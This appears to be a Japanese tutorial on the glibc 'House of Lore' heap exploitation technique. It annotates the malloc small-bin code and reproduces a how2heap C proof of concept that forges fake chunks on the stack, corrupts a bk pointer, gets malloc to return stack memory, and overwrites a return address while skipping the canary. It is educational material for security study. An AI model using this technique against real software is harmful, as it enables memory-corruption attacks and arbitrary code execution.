# House of Lore

## 概要

House of Lore 攻撃は、Glibc のヒープ管理における Small Bin の仕組みと密接に関係しています。

House of Lore を使うと、任意に指定した位置の chunk を確保させることができ、それによって任意のアドレスのメモリを書き換えられます。

House of Lore を利用するための前提は、Small Bin の chunk の bk ポインタを制御でき、かつ指定した位置の chunk の fd ポインタを制御できることです。

## 基本原理

malloc の際、要求されたメモリブロックが small bin の範囲内であれば、処理の流れは次のようになります。

```c
    /*
       If a small request, check regular bin.  Since these "smallbins"
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */

    if (in_smallbin_range(nb)) {
        // small bin のインデックスを取得
        idx = smallbin_index(nb);
        // 対応する small bin の chunk ポインタを取得
        bin = bin_at(av, idx);
        // まず victim = last(bin) を実行し、small bin の最後の chunk を取得
        // victim = bin なら、その bin は空
        // 等しくなければ、次の 2 通りの場合がある
        if ((victim = last(bin)) != bin) {
            // 1 つ目、small bin がまだ初期化されていない場合
            if (victim == 0) /* initialization check */
                // 初期化を行い、fast bins の chunk を統合する
                malloc_consolidate(av);
            // 2 つ目、small bin に空き chunk が存在する場合
            else {
                // small bin の末尾から 2 番目の chunk を取得
                bck = victim->bk;
                // bck->fd が victim かどうかを検査し、偽造を防ぐ
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // victim に対応する inuse ビットを設定
                set_inuse_bit_at_offset(victim, nb);
                // small bin のリストを変更し、small bin の最後の chunk を取り出す
                bin->bk = bck;
                bck->fd = bin;
                // main_arena でなければ、対応するフラグを設定
                if (av != &main_arena) set_non_main_arena(victim);
                // 詳細な検査
                check_malloced_chunk(av, victim, nb);
                // 確保した chunk を対応する mem の状態に変換
                void *p = chunk2mem(victim);
                // perturb_type が設定されていれば、取得した chunk を perturb_type ^ 0xff で初期化
                alloc_perturb(p, bytes);
                return p;
            }
        }
    }
```

次の部分から次のことがわかります。

```c
                // small bin の末尾から 2 番目の chunk を取得
                bck = victim->bk;
                // bck->fd が victim かどうかを検査し、偽造を防ぐ
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // victim に対応する inuse ビットを設定
                set_inuse_bit_at_offset(victim, nb);
                // small bin のリストを変更し、small bin の最後の chunk を取り出す
                bin->bk = bck;
                bck->fd = bin;
```

small bin の最後の chunk の bk を、指定したメモリアドレスにある fake chunk に書き換えられ、さらにその後の bck->fd != victim の検査も満たせるなら、small bin の bk をちょうど構築した fake chunk にできます。つまり、次に small bin のサイズを要求したときに、指定した位置の fake chunk が確保されます。

## サンプルコード

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);


  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
```

上のコードはすでに十分に説明されているので、これ以上は解説しません。

**ただし、次の点に注意が必要です。**

1. `void *p5 = malloc(1000);` は、victim_chunk が後で top_chunk と統合されるのを防ぐためのものです。

2. `free((void*)victim)` により、victim は unsort bin に入れられます。次に確保するサイズがそれより大きければ、top chunk から対応するサイズが確保され、この chunk は取り外されて対応する bin にリンクされます。それより小さければ(等しければそのまま返されます)、この chunk から対応するサイズが切り出されて対応する chunk が返され、残りは last reminder chunk となって、引き続き unsorted bin に残ります。

## 参考文献

- [https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c)
